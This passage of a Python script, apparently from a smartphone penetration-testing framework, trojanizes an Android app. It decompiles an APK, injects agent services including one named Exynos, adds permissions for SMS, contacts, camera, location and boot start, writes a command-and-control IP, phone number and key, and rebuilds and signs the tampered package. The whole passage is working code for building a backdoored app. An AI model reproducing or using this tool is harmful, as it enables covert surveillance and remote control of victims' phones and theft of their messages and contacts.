        &lt;service android:name="com.bulbsecurity.framework.Phase1" android:process=":three"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Phase2" android:process=":two"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Exynos"&gt;&lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Upload"&gt;&lt;/service&gt;
        &lt;activity android:name="com.bulbsecurity.framework.AndroidAgentActivity"&gt;
        &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.MAIN" /&gt;
        &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
        &lt;/intent-filter&gt;
        &lt;/activity&gt;
"""</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
      fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
      f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>application&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
inject <span>=</span> <span>"""
        &lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;
        &lt;uses-permission android:name="android.permission.INTERNET" /&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.SEND_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.CAMERA"/&gt;
        &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;
        &lt;uses-permission android:name="android.permission.INTERNET"/&gt;
        &lt;uses-permission android:name="android.permission.READ_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;
        &lt;uses-permission android:name="android.permission.READ_PHONE_STATE"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
"""</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;uses-permission)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
stringfile <span>=</span> foldername + <span>"/res/values/strings.xml"</span> 
inject <span>=</span> <span>"""
        &lt;string name="key"&gt;KEYKEY1&lt;/string&gt;
        &lt;string name="controlnumber"&gt;155552155554&lt;/string&gt;
        &lt;string name="controlIP"&gt;192.168.1.108&lt;/string&gt;
        &lt;string name="urii"&gt;/control&lt;/string&gt;
        &lt;string name="controlpath"&gt;/androidagent1&lt;/string&gt;
"""</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>stringfile<span>)</span>:
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
           fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
           f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>resources&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
<span>else</span>:
     inject2 <span>=</span> <span>"""
       &lt;?xml version="1.0" encoding="utf-8"?&gt;
       &lt;resources&gt;
     """</span>
     <span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + stringfile<span>)</span>
     <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
          f.<span>write</span><span>(</span>inject2<span>)</span>  
          f.<span>write</span><span>(</span>inject<span>)</span>
	  f.<span>write</span><span>(</span><span>"&lt;/resources&gt;"</span><span>)</span>
controlphone <span>=</span> <span>raw_input</span><span>(</span><span>'Phone number of the control modem for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlkey <span>=</span> <span>raw_input</span><span>(</span><span>'Control key for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlpath <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control path for agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlip <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control IP: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>key<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>key<span>\"</span>&gt;"</span> + controlkey + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;"</span> + controlphone + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;"</span> + controlip + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlip<span>\"</span>&gt;.*/&lt;string name=<span>\c</span>ontrolip<span>\"</span>&gt;"</span> + controlip + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span> 
xml_path <span>=</span> foldername + <span>'/res/values/styles.xml'</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>xml_path<span>)</span>:
     tree <span>=</span> ET.<span>parse</span><span>(</span>xml_path<span>)</span>
     <span>for</span> child <span>in</span> tree.<span>findall</span><span>(</span><span>'.//*[@parent]'</span><span>)</span>:
          <span>if</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>startswith</span><span>(</span><span>'@*android:style/'</span><span>)</span>:
               new_parent <span>=</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>replace</span><span>(</span><span>'@*android:style/'</span><span>,</span><span>'@android:style/'</span><span>)</span>
               child.<span>set</span><span>(</span><span>'parent'</span><span>,</span> new_parent<span>)</span>
     tree.<span>write</span><span>(</span>xml_path<span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" b "</span> + foldername + <span>" "</span> + foldername + <span>".apk"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"rm -rf "</span> + foldername<span>)</span> 
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + foldername + <span>".apk "</span> + foldername + <span>"/"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/res/values/public.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
<span>for</span> child <span>in</span> root:
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"key"</span> <span>)</span>:
          newkeyvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"urii"</span> <span>)</span>:
          newuriivalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlIP"</span> <span>)</span>:
          newcontrolIPvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlnumber"</span> <span>)</span>:
          newcontrolnumbervalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlpath"</span> <span>)</span>:
          newcontrolpathvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
oldkeyvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep key | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
olduriivalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep urii | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolIPvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlIP | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolpathvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlpath | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolnumbervalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlnumber | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
<span>for</span> dname<span>,</span> dirs<span>,</span> files <span>in</span> <span>os</span>.<span>walk</span><span>(</span>foldername + <span>"/smali/com/bulbsecurity/framework"</span><span>)</span>:
     <span>for</span> fname <span>in</span> files:
              fpath <span>=</span> <span>os</span>.<span>path</span>.<span>join</span><span>(</span>dname<span>,</span> fname<span>)</span>
              <span>with</span> <span>open</span><span>(</span>fpath<span>)</span> <span>as</span> f:
                    s <span>=</span> f.<span>read</span><span>(</span><span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldkeyvalue<span>,</span> newkeyvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>olduriivalue<span>,</span> newuriivalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolIPvalue<span>,</span> newcontrolIPvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolpathvalue<span>,</span> newcontrolpathvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolnumbervalue<span>,</span> newcontrolnumbervalue<span>)</span>
              <span>with</span> <span>open</span><span>(</span>fpath<span>,</span> <span>"w"</span><span>)</span> <span>as</span> f:
                    f.<span>write</span><span>(</span>s<span>)</span>
xml_path <span>=</span> foldername + <span>'/res/values/styles.xml'</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>xml_path<span>)</span>:
     tree <span>=</span> ET.<span>parse</span><span>(</span>xml_path<span>)</span>
     <span>for</span> child <span>in</span> tree.<span>findall</span><span>(</span><span>'.//*[@parent]'</span><span>)</span>:
          <span>if</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>startswith</span><span>(</span><span>'@*android:style/'</span><span>)</span>:
               new_parent <span>=</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>replace</span><span>(</span><span>'@*android:style/'</span><span>,</span><span>'@android:style/'</span><span>)</span>
               child.<span>set</span><span>(</span><span>'parent'</span><span>,</span> new_parent<span>)</span>
     tree.<span>write</span><span>(</span>xml_path<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"rm "</span> + foldername + <span>".apk"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" b "</span> + foldername + <span>" "</span> + foldername + <span>".apk"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore /root/.android/debug.keystore "</span> + foldername + <span>".apk "</span> +  <span>"androiddebugkey"</span><span>)</span></pre></td></tr></table></div>

			</div>
</div></body></html>